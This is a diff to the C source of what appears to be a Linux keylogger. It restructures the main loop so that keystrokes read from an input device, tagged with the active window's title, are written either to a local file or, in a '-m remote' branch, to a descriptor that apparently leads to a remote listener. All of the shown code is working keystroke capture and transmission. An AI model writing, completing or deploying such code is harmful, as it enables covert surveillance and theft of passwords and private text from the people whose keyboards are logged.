@@ -688,39 +688,31 @@ int main(int argc, char** argv)
 	}
 	
 	memset(used,0x0, LLEN);   
-	
-	while(1)
+	if(!m)
 	{
-
-		memset(&event, 0x0, size); 
-		if((readed = read(dev, &event, size))< size)
+		while(1)
 		{
-			fprintf(stderr, "Failed to read\n");
-			exit(1);
-		}
-		
-		
-		
-		if(event.type == EV_KEY && !event.value)
-		{
-			//I should optimize this piece of code, but I'm too lazy..
-			
-			memset(actual,0x0, LLEN);
-			sprintf(actual,"%s", get_window_title());
-			actual[LLEN-1] = '\0';
-			
-			if(strcmp(actual, used))
-			{	
-				memset(used,0x0, LLEN);
-				sprintf(used, "%s", actual);
-				used[LLEN-1] = '\0';
-				n = 1;
-				
-			}
-			
-			
-			if(!m)
+			memset(&event, 0x0, size); 
+			if((readed = read(dev, &event, size))< size)
 			{
+				fprintf(stderr, "Failed to read\n");
+				exit(1);
+			}
+		
+			if(event.type == EV_KEY && !event.value)
+			{
+				memset(actual,0x0, LLEN);
+				sprintf(actual,"%s", get_window_title());
+				actual[LLEN-1] = '\0';
+			
+				if(strcmp(actual, used))
+				{	
+					memset(used,0x0, LLEN);
+					sprintf(used, "%s", actual);
+					used[LLEN-1] = '\0';
+					n = 1;
+				}
+			
 				if(n)
 				{
 					fprintf(dst, "\n\n[%s]\n\n", used);
@@ -729,8 +721,34 @@ int main(int argc, char** argv)
 				fprintf(dst,"%s",code_to_str(event.code));
 				fflush(NULL);
 			}
-			else
-			{	
+		}
+	}
+	else
+	{	//-m remote
+		while(1)
+		{
+
+			memset(&event, 0x0, size); 
+			if((readed = read(dev, &event, size))< size)
+			{
+				fprintf(stderr, "Failed to read\n");
+				exit(1);
+			}
+			
+			if(event.type == EV_KEY && !event.value)
+			{
+				memset(actual,0x0, LLEN);
+				sprintf(actual,"%s", get_window_title());
+				actual[LLEN-1] = '\0';
+			
+				if(strcmp(actual, used))
+				{	
+					memset(used,0x0, LLEN);
+					sprintf(used, "%s", actual);
+					used[LLEN-1] = '\0';
+					n = 1;
+				}
+			
 				if(n)
 				{
 					write(lc, "\n\n[", 4 );
@@ -740,8 +758,7 @@ int main(int argc, char** argv)
 				}
 				write(lc, code_to_str(event.code), strlen(code_to_str(event.code)));	
 			}
-			
 		}
-	}
+	} //end -m remote
 	return 0;
 }
